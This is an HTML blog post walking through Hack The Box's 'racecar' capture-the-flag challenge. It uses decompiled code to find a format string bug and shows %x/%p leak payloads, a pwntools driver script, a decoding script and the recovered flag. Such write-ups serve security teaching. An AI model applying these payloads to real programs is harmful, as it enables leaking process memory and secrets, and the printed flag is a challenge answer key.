<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Hack The Box Pwn challenge - racecar | Hakune Blog</title>
<meta name=keywords content="pwn,htb,ctf">
<meta name=description content="A writeup for Hack The Box&rsquo;s racecar pwn challenge">
<meta name=author content="Aki Hakune">
<link rel=canonical href=https://git-akihakune.github.io>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style>
<link rel=preload href=/static/banner.png as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://git-akihakune.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://git-akihakune.github.io/favicon.ico>
<link rel=icon type=image/png sizes=32x32 href=https://git-akihakune.github.io/favicon.ico>
<link rel=apple-touch-icon href=https://git-akihakune.github.io/favicon.ico>
<link rel=mask-icon href=https://git-akihakune.github.io/favicon.ico>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.90.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript><meta property="og:title" content="Hack The Box Pwn challenge - racecar">
<meta property="og:description" content="A writeup for Hack The Box&rsquo;s racecar pwn challenge">
<meta property="og:type" content="article">
<meta property="og:url" content="https://git-akihakune.github.io/blog/racecar/">
<meta property="og:image" content="https://git-akihakune.github.io/img/racecar/racecar-banner.jpg"><meta property="article:section" content="blog">
<meta property="article:published_time" content="2021-12-17T06:23:50+07:00">
<meta property="article:modified_time" content="2021-12-17T06:23:50+07:00"><meta property="og:site_name" content="Hakune Blog">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://git-akihakune.github.io/img/racecar/racecar-banner.jpg">
<meta name=twitter:title content="Hack The Box Pwn challenge - racecar">
<meta name=twitter:description content="A writeup for Hack The Box&rsquo;s racecar pwn challenge">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Blogs","item":"https://git-akihakune.github.io/blog/"},{"@type":"ListItem","position":3,"name":"Hack The Box Pwn challenge - racecar","item":"https://git-akihakune.github.io/blog/racecar/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box Pwn challenge - racecar","name":"Hack The Box Pwn challenge - racecar","description":"A writeup for Hack The Box\u0026rsquo;s racecar pwn challenge","keywords":["pwn","htb","ctf"],"articleBody":"Short summary:\n Here’s the challenge: racecar.zip, zip password is hackthebox Good luck writing your pwn script   So, it’s a pwn challenge. For those first-timers, basically you’re given a program that’s also being run on a server. The task is to find a flaw in that program so that you can retrieve the real flag from the server.\nThis time, we’re given a binary file named racecar. You can grab the binary and try it out yourself, since it’s a fun challenge.\nFirst things first, let’s check what’s it.\n$ file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped ELF binary, not stripped - which means debugging information’s still there. So let’s find out what it has.\n$ readelf -s racecar 1 ⨯ Symbol table '.dynsym' contains 27 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND strcmp@GLIBC_2.0 (2) 2: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2) 3: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 4: 00000000 0 FUNC GLOBAL DEFAULT UND printf@GLIBC_2.0 (2) 5: 00000000 0 FUNC GLOBAL DEFAULT UND fgets@GLIBC_2.0 (2) 6: 00000000 0 FUNC GLOBAL DEFAULT UND time@GLIBC_2.0 (2) 7: 00000000 0 FUNC GLOBAL DEFAULT UND sleep@GLIBC_2.0 (2) 8: 00000000 0 FUNC GLOBAL DEFAULT UND alarm@GLIBC_2.0 (2) 9: 00000000 0 FUNC GLOBAL DEFAULT UND __[...]@GLIBC_2.4 (3) 10: 00000000 0 FUNC WEAK DEFAULT UND [...]@GLIBC_2.1.3 (4) 11: 00000000 0 FUNC GLOBAL DEFAULT UND malloc@GLIBC_2.0 (2) 12: 00000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.0 (2) 13: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 14: 00000000 0 FUNC GLOBAL DEFAULT UND exit@GLIBC_2.0 (2) ... # and a lot more so I'll just skip straight to needed part 84: 00000000 0 OBJECT GLOBAL DEFAULT UND stdout@@GLIBC_2.0 85: 00004010 0 NOTYPE GLOBAL DEFAULT 24 __bss_start 86: 000013e1 168 FUNC GLOBAL DEFAULT 14 main 87: 00004008 4 OBJECT GLOBAL DEFAULT 23 coins 88: 00001500 20 FUNC GLOBAL HIDDEN 14 __stack_chk_fail[...] 89: 0000400c 4 OBJECT GLOBAL DEFAULT 23 check 90: 00000000 0 FUNC GLOBAL DEFAULT UND atoi@@GLIBC_2.0 91: 00004010 0 OBJECT GLOBAL HIDDEN 23 __TMC_END__ 92: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 93: 00000618 0 FUNC GLOBAL DEFAULT 11 _init 94: 00001082 336 FUNC GLOBAL DEFAULT 14 info 95: 00000b93 111 FUNC GLOBAL DEFAULT 14 setup See that main function? We go there. :D\nHere’s what I’d got in Ghidra:\n/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */ void main(void) { int iVar1; int iVar2; int in_GS_OFFSET; iVar1 = *(int *)(in_GS_OFFSET + 0x14); setup(); banner(); info(); while (check != 0) { iVar2 = menu(); if (iVar2 == 1) { car_info(); } else { if (iVar2 == 2) { check = 0; car_menu(); } else { printf(\"\\n%s[-] Invalid choice!%s\\n\",\u0026DAT_00011548,\u0026DAT_00011538); } } } if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) { __stack_chk_fail_local(); } return; } Already got the rough idea? I’ve checked car_info() and some other functions, but seems like car_menu() is the only one has some interesting bits to it. Here’s it:\n/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */ void car_menu(void) { int iVar1; int iVar2; uint __seed; int iVar3; size_t sVar4; char *__format; FILE *__stream; int in_GS_OFFSET; undefined *puVar5; undefined4 uVar6; undefined4 uVar7; uint local_54; char local_3c [44]; int local_10; local_10 = *(int *)(in_GS_OFFSET + 0x14); uVar6 = 0xffffffff; uVar7 = 0xffffffff; do { printf(\u0026DAT_00011948); iVar1 = read_int(uVar6,uVar7); if ((iVar1 != 2) \u0026\u0026 (iVar1 != 1)) { printf(\"\\n%s[-] Invalid choice!%s\\n\",\u0026DAT_00011548,\u0026DAT_00011538); } } while ((iVar1 != 2) \u0026\u0026 (iVar1 != 1)); iVar2 = race_type(); __seed = time((time_t *)0x0); srand(__seed); if (((iVar1 == 1) \u0026\u0026 (iVar2 == 2)) || ((iVar1 == 2 \u0026\u0026 (iVar2 == 2)))) { iVar2 = rand(); iVar2 = iVar2 % 10; iVar3 = rand(); iVar3 = iVar3 % 100; } else { if (((iVar1 == 1) \u0026\u0026 (iVar2 == 1)) || ((iVar1 == 2 \u0026\u0026 (iVar2 == 1)))) { iVar2 = rand(); iVar2 = iVar2 % 100; iVar3 = rand(); iVar3 = iVar3 % 10; } else { iVar2 = rand(); iVar2 = iVar2 % 100; iVar3 = rand(); iVar3 = iVar3 % 100; } } local_54 = 0; while( true ) { sVar4 = strlen(\"\\n[*] Waiting for the race to finish...\"); if (sVar4  local_54) break; putchar((int)\"\\n[*] Waiting for the race to finish...\"[local_54]); if (\"\\n[*] Waiting for the race to finish...\"[local_54] == '.') { sleep(0); } local_54 = local_54 + 1; } if (((iVar1 == 1) \u0026\u0026 (iVar2  iVar3)) || ((iVar1 == 2 \u0026\u0026 (iVar3  iVar2)))) { printf(\"%s\\n\\n[+] You won the race!! You get 100 coins!\\n\",\u0026DAT_00011540); coins = coins + 100; puVar5 = \u0026DAT_00011538; printf(\"[+] Current coins: [%d]%s\\n\",coins,\u0026DAT_00011538); printf(\"\\n[!] Do you have anything to say to the press after your big victory?\\n %s\", \u0026DAT_000119de); __format = (char *)malloc(0x171); __stream = fopen(\"flag.txt\",\"r\"); if (__stream == (FILE *)0x0) { printf(\"%s[-] Could not open flag.txt. Please contact the creator.\\n\",\u0026DAT_00011548,puVar5); /* WARNING: Subroutine does not return */ exit(0x69); } fgets(local_3c,0x2c,__stream); read(0,__format,0x170); puts( \"\\n\\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1b[0m\" ); printf(__format); } else { if (((iVar1 == 1) \u0026\u0026 (iVar3  iVar2)) || ((iVar1 == 2 \u0026\u0026 (iVar2  iVar3)))) { printf(\"%s\\n\\n[-] You lost the race and all your coins!\\n\",\u0026DAT_00011548); coins = 0; printf(\"[+] Current coins: [%d]%s\\n\",0,\u0026DAT_00011538); } } if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) { __stack_chk_fail_local(); } return; } You can carefully examine it for studying purpose, but to keep it short, basically it’s:\n If you choose car 1 and race 2, or car 2 and race 1, you win When you win, it let you input something there, and print it back out  Here’s what would happen: Now that we’ve known what this program does, how to exploit it?\nSee this little, cute command somewhere on the 82th line of car_menu() function? :D\nprintf(__format); Yeah, as clear as day, a format string vulnerability!\nTry to insert a payload there:\n[!] Do you have anything to say to the press after your big victory?  %x%x The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 57916200170 Well, it’s vulnerable.\nSince it’s quite troublesome to enter our payload each time, here’s an on-the-spot Python script to make our life easier. :D\n#!/usr/bin/env python3 from pwn import * context.log_level = 'ERROR' def exploit(payload: str): conn = process('./racecar') conn.sendlineafter(b'Name', b'aki') conn.sendlineafter(b'Nickname', b'aki') conn.sendlineafter(b'selection', b'2') conn.sendlineafter(b'car', b'1') conn.sendlineafter(b'Circuit', b'2') conn.sendlineafter(b'victory?', bytes(payload, encoding='utf-8')) conn.recv() print(conn.recv().decode('utf-8')) conn.close() if __name__ == '__main__': while True: exploit(input('Enter payload: ')) I also created a flag.txt contains only AAAA, since that’ll be 41414141 in hex - much easier to spot.\n[!] Do you have anything to say to the press after your big victory?  %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 0x568e4200 0x170 0x565c8d85 0x5 0x4c 0x26 0x1 0x2 0x565c996c 0x568e4200 0x568e4380 0x41414141 0xa414141 0xf7db0100 0xaf7cc300 0x565c9d58 0x565cbf8c 0xffda98c8 0x565c938d 0x565c9540 It’s the 12th! Now, do just the same with the server, we get:\n0x574361c0 0x170 0x56555d85 0x1 0x5e 0x26 0x1 0x2 0x5655696c 0x574361c0 0x57436340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0xf149d800 0xf7f9e3fc 0x56558f8c 0xfffe9b38 0x56556441 0x1 0xfffe9be4 0xfffe9bec It doesn’t make much sense, does it? So let’s spin up another convenient script:\n#!/usr/bin/env python3 import re raw_flag = input(\"Enter the raw data: \") raw_flag = raw_flag.split()[::-1] for i in range(len(raw_flag)): raw_flag[i] = re.findall('..', raw_flag[i]) flag = [] for chars in raw_flag: word = \"\" for char in chars[::-1]: if char != '0x': word += chr(int(char, 16)) flag.append(word) flag.reverse() print(''.join(flag)) Since it’s not a piece of cake to filter out which bytes are meaningful, let’s just plug all retrieved data to the script, and whatever gibberish it yield out must contain our flag!\nIn case you’re curious, here’s that gibberish:\n]UV^\u0026liUVÀaCW@cCWHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}ØIñüãù÷UV8dUVä See our flag in the middle? :D\nAnd that’s it. Nice challenge!\n","wordCount":"1334","inLanguage":"en","image":"https://git-akihakune.github.io/img/racecar/racecar-banner.jpg","datePublished":"2021-12-17T06:23:50+07:00","dateModified":"2021-12-17T06:23:50+07:00","author":[{"@type":"Person","name":"Aki Hakune"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://git-akihakune.github.io/blog/racecar/"},"publisher":{"@type":"Organization","name":"Hakune Blog","logo":{"@type":"ImageObject","url":"https://git-akihakune.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://git-akihakune.github.io accesskey=h title="Blog (Alt + H)">
<img src=/static/banner.png alt=logo aria-label=logo height=40>Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://git-akihakune.github.io/archive/ title=archive>
<span>archive</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/blog/ title=blog>
<span>blog</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/search/ title="search (Alt + /)" accesskey=/>
<span>search</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/tags/ title=tags>
<span>tags</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://git-akihakune.github.io>Home</a>&nbsp;»&nbsp;<a href=https://git-akihakune.github.io/blog/>Blogs</a></div>
<h1 class=post-title>
Hack The Box Pwn challenge - racecar
</h1>
<div class=post-meta><span title="2021-12-17 06:23:50 +0700 +07">December 17, 2021</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Aki Hakune&nbsp;|&nbsp;<a href=https://github.com/git-akihakune/git-akihakune.github.io/tree/main/ rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header>
<div class=post-content><p>Short summary:</p>
<ul>
<li>Here&rsquo;s the challenge: <a href=/data/racecar/racecar.zip>racecar.zip</a>, zip password is <code>hackthebox</code></li>
<li>Good luck writing your pwn script</li>
</ul>
<hr>
<p>So, it&rsquo;s a pwn challenge. For those first-timers, basically you&rsquo;re given a program that&rsquo;s also being run on a server. The task is to find a flaw in that program so that you can retrieve the real flag from the server.</p>
<p>This time, we&rsquo;re given a binary file named <code>racecar</code>. You can <a href=/data/racecar/racecar.zip>grab the binary and try it out yourself</a>, since it&rsquo;s a fun challenge.</p>
<p>First things first, let&rsquo;s check what&rsquo;s it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ file racecar 
racecar: ELF 32-bit LSB pie executable, Intel 80386, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
</code></pre></div><p>ELF binary, not stripped - which means debugging information&rsquo;s still there. So let&rsquo;s find out what it has.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ readelf -s racecar                                                                                           <span style=color:#ae81ff>1</span> ⨯

Symbol table <span style=color:#e6db74>&#39;.dynsym&#39;</span> contains <span style=color:#ae81ff>27</span> entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> NOTYPE  LOCAL  DEFAULT  UND 
     1: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
     2: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
     3: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
     4: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
     5: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
     6: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND time@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
     7: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND sleep@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
     8: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
     9: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND __<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>@GLIBC_2.4 <span style=color:#f92672>(</span>3<span style=color:#f92672>)</span>
    10: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    WEAK   DEFAULT  UND <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>@GLIBC_2.1.3 <span style=color:#f92672>(</span>4<span style=color:#f92672>)</span>
    11: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
    12: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
    13: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    14: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>

    ... <span style=color:#75715e># and a lot more so I&#39;ll just skip straight to needed part</span>

    84: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> OBJECT  GLOBAL DEFAULT  UND stdout@@GLIBC_2.0
    85: <span style=color:#ae81ff>00004010</span>     <span style=color:#ae81ff>0</span> NOTYPE  GLOBAL DEFAULT   <span style=color:#ae81ff>24</span> __bss_start
    86: 000013e1   <span style=color:#ae81ff>168</span> FUNC    GLOBAL DEFAULT   <span style=color:#ae81ff>14</span> main
    87: <span style=color:#ae81ff>00004008</span>     <span style=color:#ae81ff>4</span> OBJECT  GLOBAL DEFAULT   <span style=color:#ae81ff>23</span> coins
    88: <span style=color:#ae81ff>00001500</span>    <span style=color:#ae81ff>20</span> FUNC    GLOBAL HIDDEN    <span style=color:#ae81ff>14</span> __stack_chk_fail<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
    89: 0000400c     <span style=color:#ae81ff>4</span> OBJECT  GLOBAL DEFAULT   <span style=color:#ae81ff>23</span> check
    90: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT  UND atoi@@GLIBC_2.0
    91: <span style=color:#ae81ff>00004010</span>     <span style=color:#ae81ff>0</span> OBJECT  GLOBAL HIDDEN    <span style=color:#ae81ff>23</span> __TMC_END__
    92: <span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
    93: <span style=color:#ae81ff>00000618</span>     <span style=color:#ae81ff>0</span> FUNC    GLOBAL DEFAULT   <span style=color:#ae81ff>11</span> _init
    94: <span style=color:#ae81ff>00001082</span>   <span style=color:#ae81ff>336</span> FUNC    GLOBAL DEFAULT   <span style=color:#ae81ff>14</span> info
    95: 00000b93   <span style=color:#ae81ff>111</span> FUNC    GLOBAL DEFAULT   <span style=color:#ae81ff>14</span> setup
</code></pre></div><p>See that <code>main</code> function? We go there. :D</p>
<p>Here&rsquo;s what I&rsquo;d got in <a href=https://ghidra-sre.org/>Ghidra</a>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>
<span style=color:#75715e>/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)

{
  <span style=color:#66d9ef>int</span> iVar1;
  <span style=color:#66d9ef>int</span> iVar2;
  <span style=color:#66d9ef>int</span> in_GS_OFFSET;
  
  iVar1 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(in_GS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>);
  setup();
  banner();
  info();
  <span style=color:#66d9ef>while</span> (check <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
    iVar2 <span style=color:#f92672>=</span> menu();
    <span style=color:#66d9ef>if</span> (iVar2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
      car_info();
    }
    <span style=color:#66d9ef>else</span> {
      <span style=color:#66d9ef>if</span> (iVar2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span>) {
        check <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
        car_menu();
      }
      <span style=color:#66d9ef>else</span> {
        printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>%s[-] Invalid choice!%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#f92672>&amp;</span>DAT_00011548,<span style=color:#f92672>&amp;</span>DAT_00011538);
      }
    }
  }
  <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(in_GS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>)) {
    __stack_chk_fail_local();
  }
  <span style=color:#66d9ef>return</span>;
}
</code></pre></div><p>Already got the rough idea? I&rsquo;ve checked <code>car_info()</code> and some other functions, but seems like <code>car_menu()</code> is the only one has some interesting bits to it. Here&rsquo;s it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>car_menu</span>(<span style=color:#66d9ef>void</span>)

{
  <span style=color:#66d9ef>int</span> iVar1;
  <span style=color:#66d9ef>int</span> iVar2;
  uint __seed;
  <span style=color:#66d9ef>int</span> iVar3;
  size_t sVar4;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>__format;
  FILE <span style=color:#f92672>*</span>__stream;
  <span style=color:#66d9ef>int</span> in_GS_OFFSET;
  undefined <span style=color:#f92672>*</span>puVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  uint local_54;
  <span style=color:#66d9ef>char</span> local_3c [<span style=color:#ae81ff>44</span>];
  <span style=color:#66d9ef>int</span> local_10;
  
  local_10 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(in_GS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>);
  uVar6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;
  uVar7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;
  <span style=color:#66d9ef>do</span> {
    printf(<span style=color:#f92672>&amp;</span>DAT_00011948);
    iVar1 <span style=color:#f92672>=</span> read_int(uVar6,uVar7);
    <span style=color:#66d9ef>if</span> ((iVar1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>&amp;&amp;</span> (iVar1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span>)) {
      printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>%s[-] Invalid choice!%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#f92672>&amp;</span>DAT_00011548,<span style=color:#f92672>&amp;</span>DAT_00011538);
    }
  } <span style=color:#66d9ef>while</span> ((iVar1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>&amp;&amp;</span> (iVar1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span>));
  iVar2 <span style=color:#f92672>=</span> race_type();
  __seed <span style=color:#f92672>=</span> time((time_t <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>);
  srand(__seed);
  <span style=color:#66d9ef>if</span> (((iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;&amp;</span> (iVar2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span>)) <span style=color:#f92672>||</span> ((iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>&amp;&amp;</span> (iVar2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span>)))) {
    iVar2 <span style=color:#f92672>=</span> rand();
    iVar2 <span style=color:#f92672>=</span> iVar2 <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>;
    iVar3 <span style=color:#f92672>=</span> rand();
    iVar3 <span style=color:#f92672>=</span> iVar3 <span style=color:#f92672>%</span> <span style=color:#ae81ff>100</span>;
  }
  <span style=color:#66d9ef>else</span> {
    <span style=color:#66d9ef>if</span> (((iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;&amp;</span> (iVar2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>||</span> ((iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>&amp;&amp;</span> (iVar2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>)))) {
      iVar2 <span style=color:#f92672>=</span> rand();
      iVar2 <span style=color:#f92672>=</span> iVar2 <span style=color:#f92672>%</span> <span style=color:#ae81ff>100</span>;
      iVar3 <span style=color:#f92672>=</span> rand();
      iVar3 <span style=color:#f92672>=</span> iVar3 <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>;
    }
    <span style=color:#66d9ef>else</span> {
      iVar2 <span style=color:#f92672>=</span> rand();
      iVar2 <span style=color:#f92672>=</span> iVar2 <span style=color:#f92672>%</span> <span style=color:#ae81ff>100</span>;
      iVar3 <span style=color:#f92672>=</span> rand();
